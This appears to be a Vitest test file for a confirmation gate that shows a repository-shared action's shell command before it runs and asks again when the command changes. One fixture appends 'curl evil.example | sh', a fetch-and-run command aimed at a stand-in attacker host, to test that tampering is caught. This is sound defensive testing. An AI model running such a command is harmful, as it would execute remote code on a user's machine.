// @vitest-environment happy-dom
import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { ConfirmationDialogOptions } from '@/components/confirmation-dialog-context'
import { approveSharedActionRun } from './shared-action-approval'

const shared = { name: 'Start site', script: 'pnpm dev', shared: true }

describe('approveSharedActionRun', () => {
  beforeEach(() => {
    window.localStorage.clear()
  })

  it('never asks for an action the person wrote on this Mac', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => false)
    expect(await approveSharedActionRun('repo', { ...shared, shared: false }, confirm)).toBe(true)
    expect(confirm).not.toHaveBeenCalled()
  })

  it('shows a repository action’s command before its first run and runs nothing on Cancel', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => false)
    expect(await approveSharedActionRun('repo', shared, confirm)).toBe(false)
    expect(confirm.mock.calls[0][0].title).toContain('Start site')
    expect(confirm.mock.calls[0][0].description).toContain('pnpm dev')
    // A refusal is not remembered: the next press asks again.
    expect(await approveSharedActionRun('repo', shared, confirm)).toBe(false)
    expect(confirm).toHaveBeenCalledTimes(2)
  })

  it('remembers an approval for that script in that repository only', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => true)
    expect(await approveSharedActionRun('repo', shared, confirm)).toBe(true)
    expect(await approveSharedActionRun('repo', shared, confirm)).toBe(true)
    expect(confirm).toHaveBeenCalledTimes(1)

    await approveSharedActionRun('other-repo', shared, confirm)
    expect(confirm).toHaveBeenCalledTimes(2)
  })

  it('asks again when the command text changes', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => true)
    await approveSharedActionRun('repo', shared, confirm)
    const changed = { ...shared, script: 'pnpm dev; curl evil.example | sh' }
    expect(await approveSharedActionRun('repo', changed, confirm)).toBe(true)
    expect(confirm).toHaveBeenCalledTimes(2)
    expect(confirm.mock.calls[1][0].description).toContain('curl evil.example | sh')
  })

  it('names the file the repository’s actions were read from', async () => {
    const confirm = vi.fn(async (_options: ConfirmationDialogOptions) => false)
    const list = vi.fn(async () => ({ sharedFileName: '.orca/actions.toml' }))
    Object.assign(window, { api: { repoActions: { list } } })
    try {
      await approveSharedActionRun('repo', shared, confirm)
      expect(list).toHaveBeenCalledWith('repo')
      expect(confirm.mock.calls[0][0].description).toContain('(.orca/actions.toml)')
    } finally {
      Reflect.deleteProperty(window, 'api')
    }
  })
})
